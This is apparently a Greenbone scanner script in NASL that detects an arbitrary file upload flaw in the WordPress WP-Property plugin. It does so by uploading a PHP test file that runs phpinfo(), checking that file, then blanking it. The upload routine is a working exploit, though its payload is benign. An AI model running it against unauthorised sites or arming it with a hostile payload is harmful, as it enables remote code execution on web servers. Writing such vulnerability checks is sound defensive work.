# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802640");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-12 12:12:12 +0530 (Tue, 12 Jun 2012)");
  script_name("WordPress WP-Property Plugin 'uploadify.php' Arbitrary File Upload Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49394");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53787");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18987");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113274/WordPress-WP-Property-1.35.0-Shell-Upload.html");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to upload arbitrary
PHP code and run it in the context of the Web server process.");
  script_tag(name:"affected", value:"WordPress WP-Property Plugin version 1.35.0");
  script_tag(name:"insight", value:"The flaw is due to the wp-content/plugins/wp-property/third-party/
uploadify/uploadify.php script allowing to upload files with arbitrary
extensions to a folder inside the webroot. This can be exploited to execute
arbitrary PHP code by uploading a malicious PHP script.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"WordPress WP-Property Plugin is prone to file upload vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

function upload_file(url, file, ex, folder, len, host, useragent) {

  local_var url, file, ex, folder, len, host, useragent;

  return string(

  "POST ", url, " HTTP/1.1\r\n",
  "Host: ", host, "\r\n",
  "User-Agent: ", useragent, "\r\n",
  "Content-Type: multipart/form-data; boundary=----------------------------b5d63781e685\r\n",
  "Content-Length: ", len, "\r\n\r\n",
  "------------------------------b5d63781e685\r\n",
  'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
  "Content-Type: application/octet-stream\r\n",
  "\r\n",
  ex, "\r\n",
  "------------------------------b5d63781e685\r\n",
  'Content-Disposition: form-data; name="folder"',"\r\n",
  "\r\n",
  folder, "\r\n",
  "------------------------------b5d63781e685--\r\n\r\n"

  );
}

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

folder = dir + "/wp-content/plugins/wp-property/third-party/uploadify/";
url = dir + "/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php";
file = "ov-file-upload-test.php";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

rand = rand();
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex) + 380;
req = upload_file(url:url, file:file, ex:ex, folder:folder, len:len, host:host, useragent:useragent);
res = http_keepalive_send_recv(port: port, data: req);

if(res && res =~ "^HTTP/1\.[01] 200") {

  path = string(dir, "/wp-content/plugins/wp-property/third-party/uploadify/", file);

  if(http_vuln_check(port:port, url:path, check_header:TRUE,
     pattern:"<title>phpinfo\(\)", extra_check:rand)) {

    ## Clean up the exploit
    ex = "";
    len = strlen(ex) + 380;
    req = upload_file(url:url, file:file, ex:ex, folder:folder, len:len, host:host, useragent:useragent);
    http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }

  exit(99);
}

exit(0);
